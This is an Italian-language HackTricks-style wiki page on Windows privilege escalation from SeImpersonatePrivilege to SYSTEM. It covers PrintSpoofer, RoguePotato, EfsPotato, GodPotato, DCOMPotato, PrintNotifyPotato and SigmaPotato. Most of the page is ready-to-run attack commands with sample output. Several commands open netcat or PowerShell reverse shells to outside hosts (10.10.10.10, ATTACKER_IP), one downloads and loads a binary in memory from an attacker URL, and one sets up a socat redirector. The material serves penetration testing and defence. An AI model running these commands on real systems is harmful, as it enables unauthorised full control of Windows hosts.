# RoguePotato, PrintSpoofer, SharpEfsPotato, GodPotato

{{#include ../../banners/hacktricks-training.md}}

> [!WARNING]
> **JuicyPotato non funziona** su Windows Server 2019 e Windows 10 build 1809 e successive. Tuttavia, [**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer)**,** [**RoguePotato**](https://github.com/antonioCoco/RoguePotato)**,** [**SharpEfsPotato**](https://github.com/bugch3ck/SharpEfsPotato)**,** [**GodPotato**](https://github.com/BeichenDream/GodPotato)**,** [**EfsPotato**](https://github.com/zcgonvh/EfsPotato)**,** [**DCOMPotato**](https://github.com/zcgonvh/DCOMPotato)** possono essere usati per **sfruttare gli stessi privilegi e ottenere l'accesso a livello di `NT AUTHORITY\SYSTEM`**. Questo [post sul blog](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/) approfondisce lo strumento `PrintSpoofer`, che può essere usato per abusare dei privilegi di impersonazione su host Windows 10 e Server 2019 dove JuicyPotato non funziona più.

> [!TIP]
> Un'alternativa moderna frequentemente mantenuta nel 2024–2025 è SigmaPotato (un fork di GodPotato) che aggiunge l'utilizzo in-memory/.NET reflection e supporto esteso per gli OS. Vedi l'uso rapido qui sotto e il repo in References.

Pagine correlate per background e tecniche manuali:

{{#ref}}
seimpersonate-from-high-to-system.md
{{#endref}}

{{#ref}}
from-high-integrity-to-system-with-name-pipes.md
{{#endref}}

{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

## Requisiti e problemi comuni

Tutte le seguenti tecniche si basano sull'abuso di un servizio privilegiato capace di impersonation da un contesto che possiede uno dei seguenti privilegi:

- SeImpersonatePrivilege (il più comune) o SeAssignPrimaryTokenPrivilege
- L'integrità elevata non è richiesta se il token possiede già SeImpersonatePrivilege (tipico per molti account di servizio come IIS AppPool, MSSQL, ecc.)

Controlla rapidamente i privilegi:
```cmd
whoami /priv | findstr /i impersonate
```
Note operative:

- Se la tua shell viene eseguita con un token ristretto privo di SeImpersonatePrivilege (comune per Local Service/Network Service in alcuni contesti), recupera i privilegi predefiniti dell'account usando FullPowers, poi esegui una Potato. Esempio: `FullPowers.exe -c "cmd /c whoami /priv" -z`
- PrintSpoofer necessita che il servizio Print Spooler sia in esecuzione e raggiungibile tramite l'endpoint RPC locale (spoolss). In ambienti con hardening dove Spooler è disabilitato dopo PrintNightmare, preferire RoguePotato/GodPotato/DCOMPotato/EfsPotato.
- RoguePotato richiede un OXID resolver raggiungibile su TCP/135. Se l'egress è bloccato, usa un redirector/port-forwarder (vedi esempio sotto). Le build più vecchie richiedevano il flag -f.
- EfsPotato/SharpEfsPotato abusano di MS-EFSR; se una pipe è bloccata, prova pipe alternative (lsarpc, efsrpc, samr, lsass, netlogon).
- L'errore 0x6d3 durante RpcBindingSetAuthInfo indica tipicamente un servizio di autenticazione RPC sconosciuto/non supportato; prova una pipe/transport diversa o assicurati che il servizio target sia in esecuzione.

## Demo rapida

### PrintSpoofer
```bash
c:\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd"

--------------------------------------------------------------------------------

[+] Found privilege: SeImpersonatePrivilege

[+] Named pipe listening...

[+] CreateProcessAsUser() OK

NULL

```
Note:
- Puoi usare -i per avviare un processo interattivo nella console corrente, oppure -c per eseguire un one-liner.
- Richiede il servizio Spooler. Se disabilitato, questo fallirà.

### RoguePotato
```bash
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -l 9999
# In some old versions you need to use the "-f" param
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -f 9999
```
Se outbound 135 è bloccato, pivot the OXID resolver tramite socat sul tuo redirector:
```bash
# On attacker redirector (must listen on TCP/135 and forward to victim:9999)
socat tcp-listen:135,reuseaddr,fork tcp:VICTIM_IP:9999

# On victim, run RoguePotato with local resolver on 9999 and -r pointing to the redirector IP
RoguePotato.exe -r REDIRECTOR_IP -e "cmd.exe /c whoami" -l 9999
```
### PrintNotifyPotato

PrintNotifyPotato è una nuova primitiva di abuso COM rilasciata alla fine del 2022 che prende di mira il servizio **PrintNotify** invece di Spooler/BITS. Il binario istanzia il server COM PrintNotify, sostituisce un `IUnknown` fake e poi innesca una callback privilegiata tramite `CreatePointerMoniker`. Quando il servizio PrintNotify (in esecuzione come **SYSTEM**) si riconnette, il processo duplica il token restituito e avvia il payload fornito con privilegi completi.

Key operational notes:

* Funziona su Windows 10/11 e Windows Server 2012–2022 purché il servizio Print Workflow/PrintNotify sia installato (è presente anche quando il legacy Spooler è disabilitato dopo PrintNightmare).
* Richiede che il contesto chiamante possieda **SeImpersonatePrivilege** (tipico per IIS APPPOOL, MSSQL e account di servizio dei task pianificati).
* Accetta sia un comando diretto sia una modalità interattiva così puoi restare nella console originale. Esempio:

```cmd
PrintNotifyPotato.exe cmd /c "powershell -ep bypass -File C:\ProgramData\stage.ps1"
PrintNotifyPotato.exe whoami
```

* Poiché è puramente COM-based, non sono necessari listener named-pipe o redirector esterni, rendendolo un drop-in replacement su host dove Defender blocca il RPC binding di RoguePotato.

Operatori come Ink Dragon eseguono PrintNotifyPotato immediatamente dopo aver ottenuto una ViewState RCE su SharePoint per pivotare dal worker `w3wp.exe` a SYSTEM prima di installare ShadowPad.

### SharpEfsPotato
```bash
> SharpEfsPotato.exe -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -a "whoami | Set-Content C:\temp\w.log"
SharpEfsPotato by @bugch3ck
Local privilege escalation from SeImpersonatePrivilege using EfsRpc.

Built from SweetPotato by @_EthicalChaos_ and SharpSystemTriggers/SharpEfsTrigger by @cube0x0.

[+] Triggering name pipe access on evil PIPE \\localhost/pipe/c56e1f1f-f91c-4435-85df-6e158f68acd2/\c56e1f1f-f91c-4435-85df-6e158f68acd2\c56e1f1f-f91c-4435-85df-6e158f68acd2
df1941c5-fe89-4e79-bf10-463657acf44d@ncalrpc:
[x]RpcBindingSetAuthInfo failed with status 0x6d3
[+] Server connected to our evil RPC pipe
[+] Duplicated impersonation token ready for process creation
[+] Intercepted and authenticated successfully, launching program
[+] Process created, enjoy!

C:\temp>type C:\temp\w.log
nt authority\system
```
### EfsPotato
```bash
> EfsPotato.exe "whoami"
Exploit for EfsPotato(MS-EFSR EfsRpcEncryptFileSrv with SeImpersonatePrivilege local privalege escalation vulnerability).
Part of GMH's fuck Tools, Code By zcgonvh.
CVE-2021-36942 patch bypass (EfsRpcEncryptFileSrv method) + alternative pipes support by Pablo Martinez (@xassiz) [www.blackarrow.net]

[+] Current user: NT Service\MSSQLSERVER
[+] Pipe: \pipe\lsarpc
[!] binding ok (handle=aeee30)
[+] Get Token: 888
[!] process with pid: 3696 created.
==============================
[x] EfsRpcEncryptFileSrv failed: 1818

nt authority\system
```
Suggerimento: Se una pipe fallisce o l'EDR la blocca, prova le altre pipe supportate:
```text
EfsPotato <cmd> [pipe]
pipe -> lsarpc|efsrpc|samr|lsass|netlogon (default=lsarpc)
```
### GodPotato
```bash
> GodPotato -cmd "cmd /c whoami"
# You can achieve a reverse shell like this.
> GodPotato -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.1.102 2012"
```
Note:
- Funziona su Windows 8/8.1–11 e Server 2012–2022 quando SeImpersonatePrivilege è presente.

### DCOMPotato

![image](https://github.com/user-attachments/assets/a3153095-e298-4a4b-ab23-b55513b60caa)

DCOMPotato fornisce due varianti che prendono di mira oggetti DCOM di servizio che impostano come predefinito RPC_C_IMP_LEVEL_IMPERSONATE. Compila o usa i binaries forniti ed esegui il tuo comando:
```cmd
# PrinterNotify variant
PrinterNotifyPotato.exe "cmd /c whoami"

# McpManagementService variant (Server 2022 also)
McpManagementPotato.exe "cmd /c whoami"
```
### SigmaPotato (fork aggiornato di GodPotato)

SigmaPotato aggiunge miglioramenti moderni come esecuzione in memoria tramite .NET reflection e un helper PowerShell per reverse shell.
```powershell
# Load and execute from memory (no disk touch)
[System.Reflection.Assembly]::Load((New-Object System.Net.WebClient).DownloadData("http://ATTACKER_IP/SigmaPotato.exe"))
[SigmaPotato]::Main("cmd /c whoami")

# Or ask it to spawn a PS reverse shell
[SigmaPotato]::Main(@("--revshell","ATTACKER_IP","4444"))
```
## Riferimenti

- [https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/)
- [https://github.com/itm4n/PrintSpoofer](https://github.com/itm4n/PrintSpoofer)
- [https://github.com/antonioCoco/RoguePotato](https://github.com/antonioCoco/RoguePotato)
- [https://github.com/bugch3ck/SharpEfsPotato](https://github.com/bugch3ck/SharpEfsPotato)
- [https://github.com/BeichenDream/GodPotato](https://github.com/BeichenDream/GodPotato)
- [https://github.com/zcgonvh/EfsPotato](https://github.com/zcgonvh/EfsPotato)
- [https://github.com/zcgonvh/DCOMPotato](https://github.com/zcgonvh/DCOMPotato)
- [https://github.com/tylerdotrar/SigmaPotato](https://github.com/tylerdotrar/SigmaPotato)
- [https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/](https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/)
- [FullPowers – Ripristina i privilegi token predefiniti per gli account di servizio](https://github.com/itm4n/FullPowers)
- [HTB: Media — WMP NTLM leak → giunzione NTFS a webroot RCE → FullPowers + GodPotato a SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [BeichenDream/PrintNotifyPotato](https://github.com/BeichenDream/PrintNotifyPotato)
- [Check Point Research – Inside Ink Dragon: Rivelando la rete di relay e il funzionamento interno di un'operazione offensiva furtiva](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)

{{#include ../../banners/hacktricks-training.md}}
